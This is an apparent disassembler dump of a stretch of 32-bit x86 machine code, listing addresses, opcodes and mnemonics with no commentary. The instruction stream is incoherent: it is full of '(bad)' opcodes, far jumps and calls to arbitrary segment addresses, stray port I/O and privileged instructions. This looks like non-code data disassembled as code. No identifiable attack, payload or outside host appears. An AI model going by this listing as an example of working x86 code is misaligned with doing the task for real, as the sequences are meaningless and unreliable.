  42d617:	or     al,0xfe
  42d619:	mov    edi,0x27d9150
  42d61e:	inc    BYTE PTR [ebx]
  42d620:	ret    
  42d621:	dec    edx
  42d622:	mov    ebx,DWORD PTR [edx]
  42d624:	data16 fld DWORD PTR [ebx]
  42d627:	int3   
  42d628:	add    BYTE PTR [edi+0x3efadc],dh
  42d62e:	test   BYTE PTR [edx+edi*8],bl
  42d631:	cmp    ebp,DWORD PTR [edx-0x34]
  42d634:	add    DWORD PTR [ebx-0xa3cdd7c],0x50
  42d63b:	jne    0x42d65d
  42d63d:	(bad)  
  42d63e:	out    0xbf,eax
  42d640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d641:	(bad)  
  42d642:	push   ecx
  42d644:	jmp    0x60ab:0xdcee2837
  42d64b:	jno    0x42d5f8
  42d64d:	inc    BYTE PTR [ebx-0x78e6914b]
  42d653:	mov    bl,0x12
  42d655:	(bad)  
  42d656:	inc    BYTE PTR [edx+0x74e975aa]
  42d65c:	stos   DWORD PTR es:[edi],eax
  42d65d:	dec    BYTE PTR [eax+edi*8+0xfac09d]
  42d664:	add    BYTE PTR [eax],al
  42d666:	add    BYTE PTR [eax],al
  42d668:	push   0xffffffe4
  42d66a:	add    eax,DWORD PTR [eax]
  42d66c:	mov    ch,0x72
  42d66e:	xor    ecx,edi
  42d670:	and    eax,0xdf35abab
  42d675:	int    0x2c
  42d677:	add    BYTE PTR [edx+0x6b50119c],ah
  42d67d:	jmp    0x1ea83c85
  42d682:	add    BYTE PTR [ebx+0x4fbfc533],0xc2
  42d689:	mov    esp,0xe98b4c11
  42d68e:	add    edi,DWORD PTR [edi+0x31]
  42d691:	ror    BYTE PTR [ecx+0x4fc20944],cl
  42d697:	dec    DWORD PTR [edx]
  42d699:	stos   BYTE PTR es:[edi],al
  42d69a:	jne    0x42d685
  42d69c:	je     0x42d647
  42d69e:	dec    BYTE PTR [eax+esi*8-0xd053f5b]
  42d6a5:	pop    ebx
  42d6a6:	(bad)  
  42d6a7:	push   DWORD PTR ds:0xa7f932f2
  42d6ad:	imul   ebx,DWORD PTR [edi+0x5a],0x3c7e68ac
  42d6b4:	lds    eax,FWORD PTR [esi+0x2750043]
  42d6ba:	fdivr  st(6),st
  42d6bc:	and    al,0x74
  42d6be:	lock loope 0x42d73c
  42d6c1:	add    bh,BYTE PTR [ebx-0x8e57640]
  42d6c7:	inc    ebx
  42d6c8:	jne    0x42d64c
  42d6ca:	add    esi,DWORD PTR [eax+eax*1+0x0]
  42d6d1:	sar    DWORD PTR [edi],0xe9
  42d6d4:	add    esp,DWORD PTR [eax]
  42d6d6:	or     eax,DWORD PTR [ecx+0x1d]
  42d6d9:	mov    ?,WORD PTR [ebx+0x2eca8729]
  42d6df:	repz test BYTE PTR [ecx-0x52],bl
  42d6e3:	cmp    eax,DWORD PTR [ebp+esi*2+0x2]
  42d6e7:	sub    eax,DWORD PTR [esi]
  42d6e9:	gs aad 0xa5
  42d6ec:	add    esi,DWORD PTR [esp+ecx*2+0x2]
  42d6f0:	push   ss
  42d6f1:	adc    DWORD PTR [eax],0x7abf03a9
  42d6f7:	adc    al,0xd9
  42d6f9:	xchg   ebx,eax
  42d6fa:	add    ah,BYTE PTR [esi]
  42d6fc:	sub    eax,0xbf9baa61
  42d701:	aas    
  42d702:	mov    bl,0x38
  42d704:	mov    edi,0xbee4dec6
  42d709:	mov    DWORD PTR [edx-0xd],ebx
  42d70c:	inc    ebx
  42d70d:	jne    0x42d78e
  42d70f:	lods   al,BYTE PTR ds:[esi]
  42d710:	adc    BYTE PTR [esi],ah
  42d712:	fcmovu st,st(5)
  42d714:	ret    
  42d715:	pop    edx
  42d716:	shr    ah,0x3
  42d719:	ret    0xcb87
  42d71c:	dec    edi
  42d71d:	addr16 inc edx
  42d71f:	jmp    0x38f9a16
  42d724:	lea    esi,[eax+eiz*8-0x13cb72f6]
  42d72b:	(bad)  
  42d72c:	pop    ss
  42d72d:	clc    
  42d72e:	cmp    ch,al
  42d730:	push   ebx
  42d731:	lock cmp esi,ecx
  42d734:	repnz add BYTE PTR [eax],al
  42d737:	add    BYTE PTR [eax],al
  42d739:	add    cl,cl
  42d73b:	push   ecx
  42d73c:	add    BYTE PTR [eax-0x1d],ah
  42d73f:	mov    DWORD PTR [ecx-0x1b],ebp
  42d742:	or     eax,esp
  42d744:	jle    0x42d773
  42d746:	gs sbb al,0x4
  42d749:	(bad)  
  42d74a:	mov    ecx,0x82dd1927
  42d74f:	test   DWORD PTR [edx-0xc],eax
  42d752:	inc    esi
  42d753:	test   DWORD PTR [ecx-0x1b],eax
  42d756:	inc    esi
  42d757:	mov    bh,0xce
  42d759:	push   edx
  42d75a:	outs   dx,BYTE PTR ds:[esi]
  42d75b:	test   DWORD PTR [ecx-0x2b],eax
  42d75e:	sub    eax,0x26d4fb52
  42d763:	adc    BYTE PTR [eax-0x17],al
  42d766:	pop    eax
  42d767:	jnp    0x42d7ab
  42d769:	add    dh,dh
  42d76b:	mov    esi,0x44018f0b
  42d770:	and    BYTE PTR [edi],dl
  42d772:	jb     0x42d724
  42d774:	outs   dx,BYTE PTR ds:[esi]
  42d775:	loop   0x42d70f
  42d777:	jmp    0x42d7e3
  42d779:	shl    BYTE PTR [edx-0x1a2699e9],cl
  42d77f:	inc    esp
  42d780:	pop    ss
  42d781:	cdq    
  42d782:	in     eax,0x43
  42d784:	and    al,0x39
  42d786:	add    al,cl
  42d788:	popa   
  42d789:	jb     0x42d73e
  42d78b:	jmp    0xa9c5850e
  42d790:	or     eax,0x417f8143
  42d795:	or     eax,0xd4fb52bc
  42d79a:	(bad)  
  42d79b:	adc    al,0x40
  42d79d:	jmp    0x42d7a2
  42d7a2:	add    bh,dh
  42d7a4:	lds    ecx,FWORD PTR [ebx]
  42d7a6:	cli    
  42d7a7:	ss dec edi
  42d7a9:	bound  esi,QWORD PTR [eax-0x48]
  42d7ac:	not    BYTE PTR [esi-0x56]
  42d7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7b0:	push   edi
  42d7b1:	xchg   esp,eax
  42d7b3:	inc    edx
  42d7b4:	adc    al,0x40
  42d7b6:	jmp    0xcfee57
  42d7bb:	xchg   ebx,eax
  42d7bc:	dec    BYTE PTR [edi-0x73]
  42d7bf:	xchg   edx,eax
  42d7c0:	pop    es
  42d7c1:	push   eax
  42d7c2:	(bad)  
  42d7c3:	loop   0x42d7ca
  42d7c5:	not    ebp
  42d7c7:	push   edi
  42d7c8:	loop   0x42d819
  42d7ca:	push   ss
  42d7cb:	or     al,0x6
  42d7cd:	jnp    0x42d793
  42d7cf:	enter  0x7ae7,0x7f
  42d7d3:	jl     0x42d7db
  42d7d5:	bound  eax,QWORD PTR [eax+eax*8]
  42d7d8:	add    DWORD PTR [ebp-0x72aa67b9],ecx
  42d7de:	inc    esi
  42d7df:	rcl    DWORD PTR [ebp-0x9],0xd5
  42d7e3:	aaa    
  42d7e4:	std    
  42d7e5:	mov    WORD PTR [esi-0x5f],es
  42d7e8:	(bad)  
  42d7ea:	dec    edi
  42d7eb:	pop    ebx
  42d7ec:	aam    0x60
  42d7ee:	mov    edx,ebx
  42d7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7f1:	jns    0x42d7b7
  42d7f3:	pop    eax
  42d7f4:	out    0x88,eax
  42d7f6:	inc    esi
  42d7f7:	gs out 0x7a,eax
  42d7fa:	jg     0x42d81c
  42d7fc:	add    eax,0x17e01062
  42d801:	lea    eax,[edi+0x40]
  42d804:	push   ebp
  42d805:	lea    eax,[esi+0x0]
  42d808:	add    BYTE PTR [eax],al
  42d80a:	add    BYTE PTR [eax],al
  42d80c:	daa    
  42d80d:	push   ebp
  42d80e:	not    ebp
  42d810:	mov    dl,0x7b
  42d812:	cmp    eax,0x6bacf34
  42d817:	sbb    BYTE PTR [edx],0x3
  42d81a:	jecxz  0x42d829
  42d81c:	leave  
  42d81d:	dec    eax
  42d81e:	adc    ebp,DWORD PTR [edx+0xc]
  42d821:	push   ebp
  42d822:	not    ebx
  42d824:	(bad)  
  42d825:	mov    edx,0x50dc3306
  42d82a:	pop    esi
  42d82b:	mov    DWORD PTR [edx-0x65],edx
  42d82e:	push   ecx
  42d82f:	ret    
  42d830:	aas    
  42d831:	pop    eax
  42d832:	bound  edi,QWORD PTR [eax]
  42d834:	pushw  es
  42d836:	dec    edi
  42d837:	mov    esi,DWORD PTR [ebp-0x75]
  42d83a:	mov    esp,0x3eb94514
  42d83f:	add    dh,ch
  42d841:	loopne 0x42d856
  42d843:	xchg   DWORD PTR [eax-0x21],edi
  42d846:	adc    DWORD PTR [eax+0x75],eax
  42d849:	xor    ah,bl
  42d84b:	push   ss
  42d84c:	mov    ch,0x4d
  42d84e:	dec    edx
  42d84f:	adc    dl,BYTE PTR [esi+0x5dbf80da]
  42d855:	aad    0x12
  42d857:	push   eax
  42d858:	add    BYTE PTR [eax+0x6],ah
  42d85b:	push   eax
  42d85c:	stos   BYTE PTR es:[edi],al
  42d85d:	jmp    0x42d7e9
  42d85f:	inc    ecx
  42d860:	sub    eax,0xf62f73b8
  42d865:	out    0x1b,al
  42d867:	repz mov bl,0xd3
  42d86a:	mov    ah,0x1e
  42d86c:	test   edi,ecx
  42d86e:	jae    0x42d871
  42d870:	add    BYTE PTR [eax],al
  42d872:	add    BYTE PTR [eax],al
  42d874:	add    BYTE PTR ds:0xf6293273,ch
  42d87a:	adc    dl,BYTE PTR [ebx]
  42d87c:	jne    0x42d839
  42d87e:	or     DWORD PTR [esi],0xffffff8d
  42d881:	mov    bl,0xa1
  42d883:	dec    esi
  42d884:	lea    edi,[edx+0x46fb4ebd]
  42d88a:	mov    BYTE PTR [edi+0x74a87741],al
  42d890:	dec    ecx
  42d891:	jbe    0x42d81a
  42d893:	mov    ebp,0xc31c6ddf
  42d898:	or     edx,ebx
  42d89a:	mov    ah,0xbd
  42d89c:	popa   
  42d89d:	cld    
  42d89e:	loopne 0x42d897
  42d8a0:	out    0x57,al
  42d8a2:	inc    ebx
  42d8a3:	or     BYTE PTR [ebp-0x72b16245],cl
  42d8a9:	mov    dl,0xcd
  42d8ab:	dec    esi
  42d8ac:	sti    
  42d8ad:	es inc eax
  42d8af:	mov    DWORD PTR [ecx+0x77],eax
  42d8b2:	shl    BYTE PTR [ecx+ecx*2+0x76],1
  42d8b6:	add    cl,BYTE PTR [ebx]
  42d8b8:	ret    
  42d8b9:	sbb    bh,bl
  42d8bb:	gs (bad) 
  42d8bd:	jle    0x42d8e7
  42d8bf:	faddp  st(2),st
  42d8c1:	push   esp
  42d8c2:	jns    0x42d8e5
  42d8c4:	in     al,0x3c
  42d8c6:	dec    ebx
  42d8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8c8:	sub    DWORD PTR [ebp+0x1c],esi
  42d8cb:	jmp    0x64c54d94
  42d8d0:	inc    ebx
  42d8d1:	jne    0x42d882
  42d8d3:	ror    DWORD PTR [edi-0x7516bd9c],cl
  42d8d9:	add    BYTE PTR [eax],al
  42d8db:	add    BYTE PTR [eax],al
  42d8dd:	add    BYTE PTR [esi+eax*1],dh
  42d8e0:	outs   dx,BYTE PTR ds:[esi]
  42d8e1:	vaddsd xmm3,xmm1,QWORD PTR [esi-0x4e]
  42d8e6:	xchg   edx,eax
  42d8e7:	adc    ebp,ecx
  42d8e9:	add    esi,DWORD PTR [ebp-0x48]
  42d8ec:	lods   al,BYTE PTR ds:[esi]
  42d8ed:	out    0x72,eax
  42d8ef:	add    DWORD PTR [ebp-0x1a65d8fb],esi
  42d8f5:	(bad)  
  42d8f6:	(bad)  
  42d8f7:	scas   eax,DWORD PTR es:[edi]
  42d8f8:	pop    ebp
  42d8f9:	lds    ebx,FWORD PTR [esp+eax*8]
  42d8fc:	in     al,dx
  42d8fd:	add    esp,DWORD PTR [edi]
  42d8ff:	jnp    0x42d918
  42d901:	mov    BYTE PTR [esi+eax*1+0x7df5052a],dh
  42d908:	test   al,0x3
  42d90a:	clc    
  42d90b:	sar    DWORD PTR [esi+eax*1-0x26],0xaa
  42d910:	out    0x36,eax
  42d912:	jnp    0x42d8c3
  42d914:	fist   DWORD PTR [edi-0x7f16bd9c]
  42d91a:	lods   al,BYTE PTR ds:[esi]
  42d91b:	push   es
  42d91c:	loop   0x42d978
  42d91e:	cli    
  42d91f:	jp     0x42d949
  42d921:	add    al,bh
  42d923:	rcr    DWORD PTR [ebx+ecx*1-0x56],0xaa
  42d928:	out    0x2f,eax
  42d92a:	jnp    0x42d919
  42d92c:	jmp    0x6207:0x34827404
  42d933:	ret    0xa9ff
  42d936:	add    ch,BYTE PTR [edi+0x3f]
  42d939:	stos   BYTE PTR es:[edi],al
  42d93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d93b:	xchg   ebx,ebp
  42d93d:	cmp    dl,dh
  42d93f:	and    eax,0xe9fc
  42d944:	add    BYTE PTR [eax],al
  42d946:	add    ch,bh
  42d948:	inc    ebp
  42d949:	cld    
  42d94a:	cmp    DWORD PTR [esi],ebp
  42d94c:	ss or  al,0x1
  42d94f:	js     0x42d997
  42d951:	add    cl,ch
  42d953:	mov    BYTE PTR [edx],al
  42d955:	sti    
  42d956:	hlt    
  42d957:	jle    0x42d904
  42d959:	adc    al,0x51
  42d95b:	addr16 inc edx
  42d95d:	add    BYTE PTR [ecx+edi*4+0x36],ah
  42d961:	add    esi,DWORD PTR [edx+0x34]
  42d964:	scas   al,BYTE PTR es:[edi]
  42d965:	test   BYTE PTR [ecx],ch
  42d967:	fs mov al,0x2d
  42d96a:	sub    DWORD PTR [eax-0x5416f894],edi
  42d970:	mov    ecx,0xc1ebf165
  42d975:	push   ebp
  42d976:	xchg   ecx,eax
  42d977:	js     0x42d9af
  42d979:	or     DWORD PTR [eax],ebx
  42d97b:	fprem1 
  42d97d:	pop    ds
  42d97e:	push   0x1
  42d980:	sahf   
  42d981:	out    0xeb,al
  42d983:	mov    eax,ds:0x1c9445a6
  42d988:	jnp    0x42d98d
  42d98a:	fs and esp,edx
  42d98d:	ds jmp 0xea3b5d4c
  42d993:	jno    0x42d997
  42d995:	add    BYTE PTR [ebx+0x31],bh
  42d998:	pop    esi
  42d999:	add    BYTE PTR [edx],ch
  42d99b:	bnd jmp 0x42d99d
  42d99e:	jae    0x42da03
  42d9a0:	sbb    al,BYTE PTR [eax-0x17]
  42d9a3:	jbe    0x42d957
  42d9a5:	gs call 0xe9a8dc0b
  42d9ab:	add    BYTE PTR [eax],al
  42d9ad:	add    BYTE PTR [eax],al
  42d9af:	add    ah,al
  42d9b1:	test   eax,0x42893d14
  42d9b6:	add    BYTE PTR [eax],al
  42d9b8:	mov    ecx,eax
  42d9ba:	jae    0x42d9c1
  42d9bc:	jge    0x42d9be
  42d9be:	sub    al,al
  42d9c0:	fbstp  TBYTE PTR [ecx]
  42d9c2:	add    bl,al
  42d9c4:	xchg   ebp,eax
  42d9c5:	inc    ebx
  42d9c6:	or     BYTE PTR [eax+0x44],cl
  42d9c9:	repnz or BYTE PTR [ebx+0x667b01ba],al
  42d9d0:	fadd   DWORD PTR [ecx]
  42d9d2:	jecxz  0x42da15
  42d9d4:	dec    edi
  42d9d5:	sti    
  42d9d6:	test   BYTE PTR [eax+0x43dc31b1],0xdc
  42d9dd:	add    DWORD PTR [ebp+0x35],esi
  42d9e0:	imul   ebp,DWORD PTR [ecx],0x3
  42d9e3:	fimul  WORD PTR [edi-0x4600b0fa]
  42d9e9:	or     DWORD PTR [edx],ecx
  42d9eb:	inc    eax
  42d9ec:	pushf  
  42d9ed:	cmp    DWORD PTR [ebx],0x4461b0
  42d9f3:	add    cl,cl
  42d9f5:	adc    al,ch
  42d9f7:	jp     0x42da2c
  42d9f9:	push   0xdd5c84f5
  42d9fe:	add    eax,0xdc327983
  42da03:	inc    ebx
  42da04:	mov    WORD PTR [ecx],es
  42da06:	mov    esi,0x39ca1c05
  42da0b:	add    BYTE PTR [ebp+0x50],bl
  42da0e:	not    DWORD PTR ds:0x401760
  42da14:	add    BYTE PTR [eax],al
  42da16:	add    BYTE PTR [eax],al
  42da18:	add    BYTE PTR [ebx],dl
  42da1a:	jl     0x42d9dc
  42da1c:	ret    
  42da1d:	cli    
  42da1e:	jnp    0x42da0a
  42da20:	mov    ebx,DWORD PTR [edx]
  42da22:	stc    
  42da23:	inc    edi
  42da24:	dec    eax
  42da25:	enter  0x830a,0x46
  42da29:	pop    eax
  42da2a:	cmp    BYTE PTR [edx-0x8aeb48c],0x15
  42da31:	sub    al,0x11
  42da33:	inc    eax
  42da34:	add    BYTE PTR [ebp+0x20],dh
  42da37:	out    dx,al
  42da38:	test   BYTE PTR [ebx],ch
  42da3a:	push   edi
  42da3b:	pop    es
  42da3c:	data16 jne 0x42da4c
  42da3f:	mov    ecx,0x3ecb8514
  42da44:	add    BYTE PTR [ebx+0x11874a58],ch
  42da4a:	or     dl,BYTE PTR [ebp+0x52]
  42da4d:	out    dx,al
  42da4e:	mov    cl,BYTE PTR [ecx+eax*2+0x534bf37d]
  42da55:	popa   
  42da56:	imul   BYTE PTR [ebx-0x47841dba]
  42da5c:	xor    DWORD PTR [ebp-0x4ad20553],0xffffff8f
  42da63:	xor    eax,0xf39f4b8d
  42da68:	(bad)  
  42da69:	jl     0x42da27
  42da6b:	sub    DWORD PTR [eax],esi
  42da6d:	out    dx,al
  42da6e:	pop    esp
  42da6f:	push   es
  42da70:	daa    
  42da71:	mov    dh,0xd6
  42da73:	add    cl,BYTE PTR [eax+0x20]
  42da76:	stos   DWORD PTR es:[edi],eax
  42da77:	mov    edi,0x7ea6a144
  42da7c:	inc    DWORD PTR [eax]
  42da7e:	add    BYTE PTR [eax],al
  42da80:	add    BYTE PTR [eax],al
  42da82:	call   0x4ef:0x38c3014f
  42da89:	xor    BYTE PTR [ebp-0x65],0x4f
  42da8d:	dec    edi
  42da8e:	fsubr  QWORD PTR es:[edx]
  42da91:	cld    
  42da92:	jp     0x42da60
  42da94:	mov    bh,0x14
  42da96:	jmp    0xf0431944
  42da9b:	fldcw  WORD PTR [edx]
  42da9d:	add    al,0xec
  42da9f:	pushf  
  42daa0:	stos   DWORD PTR es:[edi],eax
  42daa1:	mov    esi,0xc2b04c6
  42daa6:	push   edx
  42daa7:	aaa    
  42daa8:	pop    es
  42daa9:	sti    
  42daaa:	xor    BYTE PTR [ecx+ecx*1-0x1a69a88],0x47
  42dab2:	inc    edx
  42dab3:	add    eax,ecx
  42dab5:	sbb    al,0x35
  42dab7:	inc    ebx
  42dab8:	into   
  42dab9:	jmp    0xdd58dfb1
  42dabe:	push   ebx
  42dabf:	mov    ecx,0x3469570f
  42dac4:	loop   0x42da52
  42dac6:	test   eax,0x6671e9fa
  42dacb:	adc    esi,esi
  42dacd:	shl    ebp,cl
  42dacf:	mov    al,ds:0x27503a9
  42dad4:	test   al,0xab
  42dad6:	jp     0x42dac7
  42dad8:	in     al,0x8e
  42dada:	fcmovbe st,st(4)
  42dadc:	and    eax,0x1be73404
  42dae1:	or     BYTE PTR [ebx-0x5f],cl
  42dae4:	outs   dx,DWORD PTR ds:[esi]
  42dae5:	add    DWORD PTR [eax],eax
  42dae7:	add    BYTE PTR [eax],al
  42dae9:	add    BYTE PTR [eax],al
  42daeb:	add    eax,0x225a1a02
  42daf0:	mov    ecx,0x55750ba6
  42daf5:	pop    esi
  42daf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42daf7:	and    eax,0xbb877
  42dafc:	cmp    DWORD PTR [edx+0x4a],ebx
  42daff:	inc    edi
  42db00:	lods   eax,DWORD PTR ss:[esi]
  42db02:	test   BYTE PTR [eax+0x3307d502],bl
  42db08:	xor    eax,0xae39c0d9
  42db0d:	aam    0x3
  42db0f:	jne    0x42db13
  42db11:	add    BYTE PTR ds:[esi+0x75132d45],dh
  42db18:	add    ch,cl
  42db1a:	mov    WORD PTR [edx+0x692e6e06],?
  42db20:	test   DWORD PTR [eax],ebp
  42db22:	das    
  42db23:	jg     0x42db3d
  42db25:	jmp    0x97f184b0
  42db2a:	push   eax
  42db2b:	fild   DWORD PTR [eax]
  42db2d:	cdq    
  42db2e:	mov    eax,0xd9001a61
  42db33:	mov    dh,0x2
  42db35:	jg     0x42db28
  42db37:	je     0x42db6e
  42db39:	add    eax,0x73ae6420
  42db3e:	stc    
  42db3f:	daa    
  42db40:	imul   esp,esi,0xffffffe5
  42db43:	and    al,0x6b
  42db45:	out    0xe1,al
  42db47:	out    dx,eax
  42db48:	stos   BYTE PTR es:[edi],al
  42db49:	icebp  
  42db4a:	cdq    
  42db4b:	add    BYTE PTR [eax],al
  42db4d:	mov    al,0xe8
  42db4f:	add    BYTE PTR [eax],al
  42db51:	add    BYTE PTR [eax],al
  42db53:	add    BYTE PTR [eax-0x11e34147],ah
  42db59:	xchg   esi,eax
  42db5a:	jle    0x42db19
  42db5c:	ins    DWORD PTR es:[edi],dx
  42db5d:	cmp    edx,DWORD PTR [edx+0x74]
  42db60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db61:	mov    dh,0xe7
  42db63:	adc    eax,0x96faa823
  42db68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db69:	inc    BYTE PTR [esi+0x83622a7]
  42db6f:	xchg   ecx,eax
  42db70:	adc    eax,0xf57efaa9
  42db75:	push   0x73
  42db77:	out    0xef,al
  42db79:	shl    bh,0xf2
  42db7c:	add    ebp,DWORD PTR [eax+0x2eb96dfa]
  42db82:	add    al,0x9a
  42db84:	jo     0x42db29
  42db86:	std    
  42db87:	sbb    bh,BYTE PTR [esi-0x36aabb83]
  42db8d:	mov    cl,bh
  42db8f:	inc    esi
  42db90:	retf   0x8648
  42db93:	sub    ch,BYTE PTR [esi]
  42db95:	mov    ecx,0x5576e1bd
  42db9a:	xchg   DWORD PTR ds:0xeb9f96f0,edi
  42dba0:	jbe    0x42dba4
  42dba2:	dec    edi
  42dba3:	jb     0x42dbed
  42dba5:	std    
  42dba6:	mov    dl,0xaa
  42dba8:	bound  edx,QWORD PTR [ebx+edx*2-0x79]
  42dbac:	cmc    
  42dbad:	imul   esi,DWORD PTR [eax+eax*1+0x63],0x5c00942e
  42dbb5:	push   es
  42dbb6:	jecxz  0x42dbee
  42dbb8:	add    BYTE PTR [eax],al
  42dbba:	add    BYTE PTR [eax],al
  42dbbc:	add    bh,cl
  42dbbe:	in     eax,dx
  42dbbf:	pop    es
  42dbc0:	inc    eax
  42dbc2:	mov    ch,0x8b
  42dbc4:	mov    ebp,0xfff56bbc
  42dbc9:	inc    esp
  42dbca:	loopne 0x42dc23
  42dbcc:	dec    DWORD PTR [ebx+0x71]
  42dbcf:	imul   ecx,DWORD PTR [eax],0x8d4a6897
  42dbd5:	mov    eax,ds:0xcbfff91d
  42dbda:	(bad)  
  42dbdc:	dec    edi
  42dbdd:	test   DWORD PTR [esi+0x1],ecx
  42dbe0:	add    BYTE PTR [esi+ebx*2],cl
  42dbe3:	jb     0x42db80
  42dbe5:	sbb    esi,DWORD PTR [ecx+0x79]
  42dbe8:	(bad)  
  42dbe9:	in     al,dx
  42dbea:	cmp    BYTE PTR [edx-0x79d2238c],0x0
  42dbf1:	int3   
  42dbf2:	add    eax,0x6f24bd8d
  42dbf7:	cmc    
  42dbf8:	jmp    esp
  42dbfa:	scas   eax,DWORD PTR es:[edi]
  42dbfb:	push   edx
  42dbfc:	dec    DWORD PTR [ebx+0x5d]
  42dbff:	sbb    bl,BYTE PTR [edx+0x4b]
  42dc02:	jo     0x42dc4e
  42dc04:	call   0x39dfcc
  42dc09:	daa    
  42dc0a:	repnz or ecx,DWORD PTR [ecx+0xfba8292]
  42dc11:	adc    BYTE PTR [eax+0x769cfffa],dl
  42dc17:	inc    ebx
  42dc18:	or     al,0x8f
  42dc1a:	lds    esp,FWORD PTR [eax+0x39]
  42dc1d:	iret   
  42dc1e:	test   eax,0x7d8b
  42dc23:	add    BYTE PTR [eax],al
  42dc25:	add    BYTE PTR [eax-0x1a3f6b00],bl
  42dc2b:	inc    edx
  42dc2c:	cld    
  42dc2d:	call   0x3e50d3
  42dc32:	jne    0x42dc4b
  42dc34:	mov    edi,0xfa85e473
  42dc39:	addr16 stc 
  42dc3b:	cs aas 
  42dc3d:	add    ch,bl
  42dc3f:	repnz (bad) 
  42dc41:	push   DWORD PTR [ebp-0x50]
  42dc44:	jmp    0x42dc2d
  42dc46:	stos   BYTE PTR es:[edi],al
  42dc47:	cdq    
  42dc48:	mov    bl,0xfa
  42dc4a:	stc    
  42dc4b:	pop    edx
  42dc4c:	das    
  42dc4d:	push   esi
  42dc4e:	lahf   
  42dc4f:	stos   DWORD PTR es:[edi],eax
  42dc50:	mov    bl,0x6e
  42dc52:	jno    0x42dc97
  42dc54:	int3   
  42dc55:	call   FWORD PTR [edx]
  42dc57:	fwait
  42dc58:	mov    bl,0x31
  42dc5a:	sbb    eax,0xaf9b205
  42dc5f:	pop    ds
  42dc60:	les    esi,FWORD PTR [ebx-0x48]
  42dc63:	inc    ebp
  42dc64:	add    BYTE PTR [ebp+0x685357b0],cl
  42dc6a:	mov    edi,0xeafffe9a
  42dc6f:	shl    BYTE PTR [esi-0x4b6f1cdd],1
  42dc75:	xor    DWORD PTR [ebp-0x7731af2],0x52
  42dc7c:	mov    dl,0xfa
  42dc7e:	retf   0xb50a
  42dc81:	adc    al,0xb9
  42dc83:	int3   
  42dc84:	add    BYTE PTR ds:0xa77b46,ah
  42dc8b:	add    BYTE PTR [eax],al
  42dc8d:	add    BYTE PTR [eax],al
  42dc8f:	mov    bl,0x1f
  42dc91:	mov    ch,0x4f
  42dc93:	sbb    eax,0x750003f4
  42dc98:	push   eax
  42dc99:	jmp    0xf9fa:0xb2359ae7
  42dca0:	fisubr DWORD PTR [edi]
  42dca2:	push   es
  42dca3:	(bad)  
  42dca4:	pop    ebp
  42dca5:	push   cs
  42dca6:	ret    0x9a75
  42dca9:	outs   dx,BYTE PTR ds:[esi]
  42dcaa:	add    BYTE PTR [esi-0x7ce7833],cl
  42dcb0:	add    bl,BYTE PTR [ebx]
  42dcb2:	xor    BYTE PTR [eax-0x59],bh
  42dcb5:	shr    BYTE PTR [ebx-0x4aee2e17],cl
  42dcbb:	les    ebx,FWORD PTR [edx-0x57b02d87]
  42dcc1:	mov    dh,0xc3
  42dcc3:	scas   eax,DWORD PTR es:[edi]
  42dcc4:	dec    eax
  42dcc5:	sahf   
  42dcc6:	retf   0xf700
  42dcc9:	call   0x91f4cf1b
  42dcce:	mov    BYTE PTR [esi+edi*8+0x76f2fda9],ch
  42dcd5:	sub    BYTE PTR [eax+edi*8],al
  42dcd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dcd9:	pop    esp
  42dcda:	pop    es
  42dcdb:	push   ds
  42dcdc:	lock rol BYTE PTR [ebp+0x24],0xa8
  42dce1:	ror    DWORD PTR [ebp+ebx*1+0x3b],0x98
  42dce6:	mov    ah,0xff
  42dce8:	mov    al,0x2c
  42dcea:	loopne 0x42dd5a
  42dcec:	add    DWORD PTR [edx+0x292eaefd],esp
  42dcf2:	add    al,0x0
  42dcf4:	add    BYTE PTR [eax],al
  42dcf6:	add    BYTE PTR [eax],al
  42dcf8:	popa   
  42dcf9:	add    BYTE PTR [ebx],dh
  42dcfb:	lods   al,BYTE PTR ds:[esi]
  42dcfc:	test   eax,0x3fb491d1
  42dd01:	jnp    0x42dca5
  42dd03:	push   ebp
  42dd04:	adc    edi,edi
  42dd06:	call   0x61a6ca86
  42dd0b:	add    BYTE PTR [ebx],0x4e
  42dd0e:	pop    esi
  42dd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd10:	cmp    ebx,DWORD PTR [esi+0x1e9e8070]
  42dd16:	mov    dh,0x4d
  42dd18:	inc    esi
  42dd19:	jnp    0x42dd7a
  42dd1b:	lock loop 0x42dd93
  42dd1e:	(bad)  
  42dd20:	pop    edx
  42dd21:	jns    0x42dcef
  42dd23:	fistp  QWORD PTR [esi-0x66]
  42dd26:	inc    esi
  42dd27:	sub    al,0x8f
  42dd29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd2a:	ins    DWORD PTR es:[edi],dx
  42dd2b:	sub    al,0x79
  42dd2d:	jne    0x42dd2e
  42dd2f:	lods   al,BYTE PTR ds:[esi]
  42dd30:	call   0x2eeb:0x52a5890b
  42dd37:	sub    DWORD PTR [ebp-0x30],esp
  42dd3a:	ret    0x42a5
  42dd3d:	or     edx,DWORD PTR [ebp+eiz*2-0x5a3cfd4a]
  42dd44:	xor    bl,bl
  42dd46:	lahf   
  42dd47:	jg     0x42dcff
  42dd49:	add    ah,BYTE PTR [edx+0x70]
  42dd4c:	sbb    dh,0x13
  42dd4f:	pusha  
  42dd50:	mov    ds:0x9b0017de,al
  42dd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd56:	cli    
  42dd57:	jmp    0xf94f094f
  42dd5c:	add    BYTE PTR [eax],al
  42dd5e:	add    BYTE PTR [eax],al
  42dd60:	add    BYTE PTR [edi-0x7c],dh
  42dd63:	xchg   ebp,eax
  42dd64:	jmp    0x6294dfdf
  42dd69:	into   
  42dd6a:	sahf   
  42dd6b:	pop    edx
  42dd6c:	mov    edi,0xeca186ab
  42dd72:	iret   
  42dd73:	or     ch,BYTE PTR [ebp-0x11]
  42dd76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd77:	cli    
  42dd78:	jmp    0xb74c77c8
  42dd7d:	lods   al,BYTE PTR es:[esi]
  42dd7f:	jle    0x42ddae
  42dd81:	int    0xe2
  42dd83:	cli    
